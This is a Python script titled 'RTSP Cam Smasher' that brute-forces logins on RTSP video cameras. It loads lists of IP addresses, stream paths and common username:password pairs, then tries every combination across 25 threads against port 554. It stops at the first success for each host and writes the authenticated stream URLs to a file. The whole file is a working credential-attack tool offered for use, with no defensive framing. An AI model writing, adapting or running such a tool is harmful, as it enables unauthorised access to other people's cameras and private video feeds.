import cv2
import os
import socket
import threading
import time
import select


# Load the IPs, routes, and user:password combinations
def load_file(filename):
    """Load lines from a file, removing empty lines and stripping whitespace."""
    with open(filename, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

# Load data from files
ips = load_file("ip_list.txt")
routes = load_file("routes.txt")
userpass_list = load_file("pass-top-combine.txt")

THREADS = 25  # Number of threads
THREADBLOCKSIZE = 50  # Batch size per thread
SLEEPTIME = 2  # Sleep time between batches


print("---------- RTSP Cam Smasher ----------")
print("---------- By InnerFire ----------")


def test_rtsp_stream(ip, route, userpass):
    """Test an RTSP stream and return if it's working or not."""
    rtsp_url = f"rtsp://{userpass}@{ip}:554{route}"
    print(f"🔍 Testing: {rtsp_url}")

    cap = cv2.VideoCapture(rtsp_url)
    if cap.isOpened():
        print(f"✅ SUCCESS: {rtsp_url}")
        cap.release()
        return rtsp_url  # Return working RTSP URL
    else:
        print(f"❌ FAILED: {rtsp_url}")
        return None

class ThreadedList(threading.Thread):
    """Thread-safe list handling"""
    def __init__(self, lst):
        threading.Thread.__init__(self)
        self.list = lst
        self.found = []
        self.lock = threading.Lock()

    def getSubList(self, size):
        """Get a batch of items from the list"""
        with self.lock:
            if len(self.list) >= size:
                batch = self.list[:size]
                self.list = self.list[size:]
            else:
                batch = self.list[:]
                self.list = []
        return batch

    def hasItems(self):
        """Check if list has items left"""
        return len(self.list) > 0

    def addFound(self, result):
        """Store successful RTSP URLs"""
        with self.lock:
            self.found.append(result)

    def getAllFoundAndClear(self):
        """Get all successful URLs and clear the list"""
        with self.lock:
            found_urls = self.found[:]
            self.found = []
        return found_urls

class RTSPAuthThreader(threading.Thread):
    """Threading class for testing RTSP authentication"""
    def __init__(self, workList, lock, stop_flag):
        threading.Thread.__init__(self)
        self.workList = workList
        self.lock = lock
        self.done = False
        self.stop_flag = stop_flag  # <-- NEW: shared Event to stop after first success

    def forceDone(self):
        """Force the thread to stop"""
        self.done = True

    def run(self):
        """Run the thread to process RTSP tests"""
        while not self.done and not self.stop_flag.is_set():
            batch = self.workList.getSubList(THREADBLOCKSIZE)
            if not batch:
                break
            for ip, route, userpass in batch:
                if self.done or self.stop_flag.is_set():
                    break
                result = test_rtsp_stream(ip, route, userpass)
                if result:
                    # If success, store it and signal all threads to stop further testing
                    self.workList.addFound(result)
                    self.stop_flag.set()
                    break
            time.sleep(SLEEPTIME)

def main():
    results = []
    lock = threading.Lock()

    for ip in ips:
        # Create a new stop_flag for each IP
        stop_flag = threading.Event()

        # Put all (ip, route, userpass) combos into a single queue
        workQueue = ThreadedList([(ip, route, userpass) 
                                  for route in routes 
                                  for userpass in userpass_list])

        # Create and start threads, passing stop_flag
        threads = [RTSPAuthThreader(workQueue, lock, stop_flag) for _ in range(THREADS)]
        for t in threads:
            t.start()

        # Wait for all threads to finish or stop
        for t in threads:
            t.join()

        # Collect valid RTSP URLs
        results.extend(workQueue.getAllFoundAndClear())

    # Save working RTSP streams
    if results:
        with open("working_rtsp.txt", "w") as f:
            for url in results:
                f.write(url + "\n")
        print("\n✅ Working RTSP streams saved in working_rtsp.txt")

if __name__ == "__main__":
    main()
